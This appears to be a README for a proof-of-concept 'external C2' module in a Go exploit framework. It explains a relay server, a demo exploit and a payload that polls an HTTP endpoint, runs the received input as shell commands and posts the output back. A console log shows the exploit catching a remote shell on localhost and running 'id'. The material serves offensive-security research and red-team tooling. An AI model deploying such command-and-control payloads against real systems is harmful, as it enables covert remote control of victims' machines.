# External Payload Experiments Demo

This is a simple bare minimum proof-of-concept of how to structure external C2s. It contains changes to make the framework work (not optimally) with modules that communicate with a third-party to facility what most C2 systems call "malleable" C2.

This little demo contains:

- A server - `c2/simpleexternal/example/externalserver.go`
- A demonstration exploit - `c2/simpleexternal/example/external-payload/exploit.go`
- A scaffold of a payload - `c2/simpleexternal/example/external-payload/payload/payload.go`

## How it works

The server creates a very simple little queue for the client and server to communicate through (in reality this would be an external service like Slack), but for a small demo it just simulates that. The new `SimpleExternal` C2 type utilizes calls to the HTTP server for a read and write endpoint. The client payload is where an external C2 payload would be utilized or integrated and is one of the next steps in the chain for exploration, but in this demo it simply is a loop of querying for reading from the client endpoint, calling `os.Command` with the input data from the endpoint, and then writing the output to client write endpoint.

```console
$ cd $GOEXPLOITDIR/c2/simpleexternal/example/external-payload/payload
$ go build payload.go
$ cd $GOEXPLOITDIR/c2/simpleexternal/example
$ go run externalserver.go
2024/06/28 10:52:29 Starting external server on 127.0.0.1:8080
...
# in another window
$ cd $GOEXPLOITDIR/c2/simpleexternal/example/external-payload
$ go run exploit.go -rhost 127.0.0.1 -e -lhost 127.0.0.1 -lport 80 -ell DEBUG -externalServer.ReadURL http://127.0.0.1:8080/server/read -externalServer.WriteURL http://127.0.0.1:8080/server/write
time=2024-06-28T10:53:52.691-06:00 level=STATUS msg="Starting target" index=0 host=127.0.0.1 port=80 ssl=false "ssl auto"=false
time=2024-06-28T10:53:55.696-06:00 level=SUCCESS msg="Caught new shell from http://127.0.0.1:8080/server/read"
time=2024-06-28T10:53:55.697-06:00 level=STATUS msg="Active shell from http://127.0.0.1:8080/server/read"
id
uid=redacted(poptart) gid=redacted groups=redacted
```
